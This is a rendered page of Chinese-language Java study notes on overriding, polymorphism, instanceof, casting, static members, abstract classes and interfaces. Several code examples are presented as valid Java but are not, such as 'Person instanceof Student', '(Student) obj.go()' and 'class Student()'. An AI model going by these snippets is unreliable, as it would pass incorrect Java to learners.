#E06C75">是方法的重写，和属性无关</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 有static的情况</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #56B6C2">!</span><span style="color: #E06C75">[image</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">20251024211537644</span><span style="color: #E06C75">](https</span><span style="color: #C678DD">:</span><span style="color: #7F848E; font-style: italic">//cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125605929.png)</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  父类有text方法，子类也有text方法</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  调用时，A和B方法不同，但是</span><span style="color: #56B6C2">**</span><span style="color: #E06C75">父类的引用指向了子类</span><span style="color: #56B6C2">**</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  静态方法不支持重写</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  这</span><span style="color: #56B6C2">**</span><span style="color: #E06C75">不是</span><span style="color: #56B6C2">**</span><span style="color: #E06C75"> “方法重写”，（因为静态方法不支持重写，只是 “子类定义了同名静态方法）</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 无static</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  而且重写的关键词只能是public不能是private</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  而且还会出现注释  </span><span style="color: #ABB2BF">@</span><span style="color: #E5C07B">Override</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #56B6C2">!</span><span style="color: #E06C75">[image</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">20251024212744560</span><span style="color: #E06C75">](https</span><span style="color: #C678DD">:</span><span style="color: #7F848E; font-style: italic">//cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125608057.png)</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  相当于子类重写了父类的方法</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  第一个输出是子类的</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  第二个输出还是子类（</span><span style="color: #E5C07B">B</span><span style="color: #E06C75">   b </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">A</span><span style="color: #E06C75">()  父类被重写）</span></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #E06C75">总结：</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">重写</span><span style="color: #C678DD">:</span><span style="color: #E06C75">需要有继承关系，子类重写父类的方法</span><span style="color: #56B6C2">!</span></span><span class="line"><span style="color: #E06C75">1</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">方法名必须相同</span></span><span class="line"><span style="color: #E06C75">2</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">参数列表列表必须相同</span></span><span class="line"><span style="color: #E06C75">3</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">修饰符</span><span style="color: #C678DD">:</span><span style="color: #E06C75">范围可以扩大但不能缩小                      </span><span style="color: #C678DD">public</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75">Protected</span><span style="color: #56B6C2">&gt;</span><span style="color: #E06C75">Default</span><span style="color: #56B6C2">&gt;</span><span style="color: #C678DD">private</span></span><span class="line"><span style="color: #E06C75">4</span><span style="color: #ABB2BF">.</span><span style="color: #E06C75">抛出的异常</span><span style="color: #C678DD">:</span><span style="color: #E06C75">范围，可以被缩小，但不能扩大</span><span style="color: #C678DD">:</span><span style="color: #E06C75">  classNotFoundException （小）</span><span style="color: #ABB2BF">----</span><span style="color: #C678DD">-&gt;</span><span style="color: #61AFEF">Exception</span><span style="color: #E06C75">(大)</span></span><span class="line"><span style="color: #E06C75">重写，子类的方法和父类必要一致</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">方法体不同</span><span style="color: #56B6C2">!</span></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #E06C75">为什么需要重写</span><span style="color: #C678DD">:</span></span><span class="line"><span style="color: #E06C75">父类的功能，子类不一定需要，或者不一定满足</span></span><span class="line"></span><span class="line"></span><span class="line"></span><span class="line"><span style="color: #56B6C2">**</span><span style="color: #E06C75">重写   VS   重载</span><span style="color: #56B6C2">**</span><span style="color: #C678DD">:</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">!</span><span style="color: #E06C75">[image</span><span style="color: #56B6C2">-</span><span style="color: #D19A66">20251024213257448</span><span style="color: #E06C75">](https</span><span style="color: #C678DD">:</span><span style="color: #7F848E; font-style: italic">//cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125609553.png)</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">## 多态</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">其实上面说的重写就是体现多态</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">为了让子类能够根据自身特性 “定制” 父类的行为，从而让代码更灵活、更贴合场景</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">就是我在上面写的    `有static的情况`   和  `无static的这两种`</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">**</span><span style="color: #E06C75">注意事项：</span><span style="color: #56B6C2">**</span></span><span class="line"></span><span class="line"><span style="color: #D19A66">1.</span><span style="color: #E06C75"> 多态是方法的多态，属性没有多态</span></span><span class="line"><span style="color: #D19A66">2.</span><span style="color: #E06C75"> 父类和子类，有联系 类型转换异常！ClassCastException！</span></span><span class="line"><span style="color: #D19A66">3.</span><span style="color: #E06C75"> 存在条件： 继承关系，方法需要重写，父类引用指向子类对象！ </span><span style="color: #E5C07B">Father</span><span style="color: #E06C75"> f1 </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Son</span><span style="color: #E06C75"> ()</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">不能重写的：</span></span><span class="line"></span><span class="line"><span style="color: #D19A66">1.</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> 方法，属于类，它不属于实例</span></span><span class="line"><span style="color: #D19A66">2.</span><span style="color: #E06C75"> </span><span style="color: #C678DD">final</span><span style="color: #E06C75"> 常量；</span></span><span class="line"><span style="color: #D19A66">3.</span><span style="color: #E06C75"> </span><span style="color: #C678DD">private</span><span style="color: #E06C75"> 方法；</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">## instanceof和类型转换</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> </span><span style="color: #C678DD">instanceof</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  (类型转换) 引用类型，判断一个对象是什么类</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #56B6C2">**</span><span style="color: #E06C75">满足父子关系就是ture    否则就是false</span><span style="color: #56B6C2">**</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  ```java</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">void</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">main</span><span style="color: #E06C75">(</span><span style="color: #E5C07B">String</span><span style="color: #E06C75">[] args) {</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #7F848E; font-style: italic">//Object &gt; String</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #7F848E; font-style: italic">//Object &gt; Person &gt; Teacher</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #7F848E; font-style: italic">//Object &gt; Person &gt; Student</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #E5C07B">Object</span><span style="color: #E06C75"> object </span><span style="color: #56B6C2">=</span><span style="color: #E06C75"> </span><span style="color: #C678DD">new</span><span style="color: #E06C75"> </span><span style="color: #61AFEF">Student</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">  </span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(object </span><span style="color: #C678DD">instanceof</span><span style="color: #ABB2BF"> Student);</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">//true</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(object </span><span style="color: #C678DD">instanceof</span><span style="color: #ABB2BF"> Person);</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">//true</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(object </span><span style="color: #C678DD">instanceof</span><span style="color: #ABB2BF"> Object);</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">//true</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(object </span><span style="color: #C678DD">instanceof</span><span style="color: #ABB2BF"> Teacher);</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">//False</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(object </span><span style="color: #C678DD">instanceof</span><span style="color: #ABB2BF"> String);</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">//False</span></span><span class="line"><span style="color: #E06C75">  }</span></span><span class="line"><span style="color: #E06C75">  ```</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  如果将`object`变成`Person`</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  ```</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Person</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">instanceof</span><span style="color: #ABB2BF"> Student);</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">//true</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Person</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">instanceof</span><span style="color: #ABB2BF"> Person);</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">//true</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Person</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">instanceof</span><span style="color: #ABB2BF"> Object);</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">//true</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Person</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">instanceof</span><span style="color: #ABB2BF"> Teacher);</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">//False</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Person</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">instanceof</span><span style="color: #ABB2BF"> String);</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">//编译报错（Person和String是同级的）</span></span><span class="line"><span style="color: #E06C75">  ```</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  换成`Student`</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  ```</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Student</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">instanceof</span><span style="color: #ABB2BF"> Student);</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">//true</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Student</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">instanceof</span><span style="color: #ABB2BF"> Person);</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">//true</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Student</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">instanceof</span><span style="color: #ABB2BF"> Object);</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">//true</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Student</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">instanceof</span><span style="color: #ABB2BF"> Teacher);</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">//编译报错</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #E5C07B">System</span><span style="color: #ABB2BF">.</span><span style="color: #E5C07B">out</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">println</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">Student</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">instanceof</span><span style="color: #ABB2BF"> String);</span><span style="color: #E06C75"> </span><span style="color: #7F848E; font-style: italic">//编译报错（Person和String是同级的）</span></span><span class="line"><span style="color: #E06C75">  ```</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 强制转化</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  在Person类里面有run（父）</span></span><span class="line"><span style="color: #E06C75">  在Student类里面有go（子）</span></span><span class="line"><span style="color: #E06C75">  想要  对象  调用go就要   </span><span style="color: #E5C07B">Perso类型强制转化为Student类型</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  ```java</span></span><span class="line"><span style="color: #E06C75">  </span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Application</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">      </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> main</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF">[] </span><span style="color: #E06C75; font-style: italic">args</span><span style="color: #ABB2BF">)</span><span style="color: #61AFEF"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #ABB2BF">          </span><span style="color: #7F848E; font-style: italic">//类型之间的转化： 父  子</span></span><span class="line"><span style="color: #ABB2BF">          </span><span style="color: #7F848E; font-style: italic">//高                低</span></span><span class="line"><span style="color: #ABB2BF">          </span><span style="color: #E5C07B">Person</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">obj</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> </span><span style="color: #C678DD">new</span><span style="color: #ABB2BF"> </span><span style="color: #61AFEF">Student</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">          </span><span style="color: #7F848E; font-style: italic">//student将这个对象转换为Student类型，我们就可以使用Student类型的方法了！</span></span><span class="line"><span style="color: #ABB2BF">          </span><span style="color: #E5C07B">Student</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75">student</span><span style="color: #ABB2BF"> </span><span style="color: #56B6C2">=</span><span style="color: #ABB2BF"> (Student) obj;</span></span><span class="line"><span style="color: #ABB2BF">          </span><span style="color: #E5C07B">student</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">go</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">      }</span></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #E06C75">  ```</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  ```java</span></span><span class="line"><span style="color: #E06C75">  (Student) </span><span style="color: #E5C07B">obj</span><span style="color: #ABB2BF">.</span><span style="color: #61AFEF">go</span><span style="color: #ABB2BF">();</span><span style="color: #7F848E; font-style: italic">//或者直接这样</span></span><span class="line"><span style="color: #E06C75">  ```</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">总结：</span></span><span class="line"></span><span class="line"><span style="color: #D19A66">1.</span><span style="color: #E06C75"> 父类引用指向子类的对象</span></span><span class="line"><span style="color: #D19A66">2.</span><span style="color: #E06C75"> 把子类转换为父类，向上转型（子类的方法可能会部分丢失）</span></span><span class="line"><span style="color: #D19A66">3.</span><span style="color: #E06C75"> 把父类转换为子类，向下转型</span><span style="color: #C678DD">:</span><span style="color: #E06C75">强制转换</span></span><span class="line"><span style="color: #D19A66">4.</span><span style="color: #E06C75"> 方便方法调用，减少重复代码</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 向上转型，这让代码更灵活（比如用父类作为方法参数，兼容所有子类）</span></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 向下转型为了突破父类引用的限制，访问子类特有的功能</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">## </span><span style="color: #C678DD">static</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">```java</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75">  </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Student</span><span style="color: #E06C75">()</span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">static</span><span style="color: #E06C75"> </span><span style="color: #C678DD">int</span><span style="color: #E06C75"> age</span><span style="color: #ABB2BF">;</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #E06C75"> string name</span><span style="color: #ABB2BF">;</span><span style="color: #E06C75">  </span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> run</span><span style="color: #ABB2BF">(){</span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">static</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> go</span><span style="color: #ABB2BF">(){</span></span><span class="line"><span style="color: #ABB2BF">        </span></span><span class="line"><span style="color: #ABB2BF">    }</span></span><span class="line"><span style="color: #E06C75">    </span></span><span class="line"><span style="color: #ABB2BF">}</span></span><span class="line"><span style="color: #E06C75">```</span></span><span class="line"></span><span class="line"><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 静态方法和非静态方法</span></span><span class="line"></span><span class="line"><span style="color: #E06C75">  </span><span style="color: #56B6C2">-</span><span style="color: #E06C75"> 静态</span></span></code></pre></div></div></figure><pre><code>Student.go();或者go();<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">- 非静态</span></span></code></pre></div></div></figure>Student s1=new Student;s1.run();<figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">- 看静态属性和非静态属性</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">  - 静态属性</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">    可以作为类变量调用</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">    ```java</span></span><span class="line"><span style="color: #abb2bf">    System.out.println(Student.age);</span></span><span class="line"><span style="color: #abb2bf">    //name就不行</span></span></code></pre></div></div></figure></code></pre><ul><li><p>属性</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">Student s1=new Student;</span></span><span class="line"><span style="color: #abb2bf">//这俩都能通过对象访问</span></span><span class="line"><span style="color: #abb2bf">System.out.println(s1.age);</span></span><span class="line"><span style="color: #abb2bf">System.out.println(s1.name);</span></span></code></pre></div></div></figure></li><li><p>匿名代码块（啥也没，就俩大括号）</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">{</span></span><span class="line"><span style="color: #abb2bf">}</span></span></code></pre></div></div></figure></li><li><p>静态代码块·（<strong>只执行一次</strong>）</p><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">static{</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">}</span></span></code></pre></div></div></figure></li></ul><p>最早输出的是：   静态代码块—匿名代码块—构造方法</p><p>第二次输出：匿名代码块—构造方法</p><h2 id="抽象"><a href="#抽象" class="headerlink" title="抽象"></a>抽象</h2><ul><li><p>abstract</p><p>空着，先不写</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//abstract 抽象类：</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">abstract</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">Action</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//约束~有人帮我们实现~</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//abstract ，抽象方法，只有方法名字，没有方法的实现！</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">public</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">abstract</span><span style="color: #61AFEF"> </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> doSomething</span><span style="color: #ABB2BF">();</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><p>继承抽象类 需要重写抽象方法</p></li><li><p>总结：</p><ol><li>不能new这个抽象类，只能靠子类去实现它：约束!（强制重写）</li><li>抽象类中可以写普通的方法</li><li>抽象方法必须在抽象类中</li></ol></li></ul><p>用于处理 <strong>一组具有共性但实现不同的事物</strong>，减少代码量（比如动物的叫声）</p><p>（针对用途）对比重写和抽象：</p><ul><li>重写：是实现抽象约束的核心手段，但是普通方法是“可选性”重写</li><li>抽象：抽象类的抽象方法强制要求必须重写</li></ul><h2 id="接口"><a href="#接口" class="headerlink" title="接口"></a>接口</h2><p><img src="https://cdn.jsdelivr.net/gh/zhz0177/picture-bed@main/img/20251027125615305.png" alt="image-20251025193727309"></p><p>​类        抽象类        接口</p><ul><li><p>接口:只有规范!自己无法写方法~专业的约束!约束和实现分离:面向接口编程</p><p><strong>接口的本质是契约</strong>（就像我们人间的法律一样。制定好后大家都遵守）</p></li><li><p>多用接口，少用重写：</p><p>原因：接口可以多继承，重写单继承（excends）</p></li><li><p>interface定义关键字</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #7F848E; font-style: italic">//interface 定义的关键字， 接口都需要有实现类</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">interface</span><span style="color: #E06C75"> </span><span style="color: #E5C07B">UserService</span><span style="color: #E06C75"> </span><span style="color: #ABB2BF">{</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #7F848E; font-style: italic">//接口中的所有定义其实都是抽象的 public abstract（因为默认，所以隐藏了）</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> add</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">name</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> delete</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">name</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> update</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">name</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #E06C75">    </span><span style="color: #C678DD">void</span><span style="color: #61AFEF"> query</span><span style="color: #ABB2BF">(</span><span style="color: #E5C07B">String</span><span style="color: #ABB2BF"> </span><span style="color: #E06C75; font-style: italic">name</span><span style="color: #ABB2BF">);</span></span><span class="line"><span style="color: #ABB2BF">}</span></span></code></pre></div></div></figure><figure class="shiki"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #abb2bf">public interface TimeService {</span></span><span class="line"><span style="color: #abb2bf"></span></span><span class="line"><span style="color: #abb2bf">}</span></span></code></pre></div></div></figure></li><li><p>接口要有实现类  implements（关键词）</p><figure class="shiki java"><div class='codeblock'><div class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></div><div class="code"><pre class="shiki one-dark-pro"><code><span class="line"><span style="color: #C678DD">package</span><span style="color: #E06C75"> </span><span style="color: #C678DD">com.oop.demo09</span><span style="color: #ABB2BF">;</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 抽象类： extends~</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 类 可以实现接口 implements 接口</span></span><span class="line"><span style="color: #7F848E; font-style: italic">// 实现了接口的类，就需要重写接口中的方法~</span></span><span class="line"></span><span class="line"><span style="color: #7F848E; font-style: italic">// 多继承~利用接口实现多继承~</span></span><span class="line"><span style="color: #C678DD">public</span><span style="color: #E06C75"> </span><span style="color: #C678DD">class</span><span style="color: 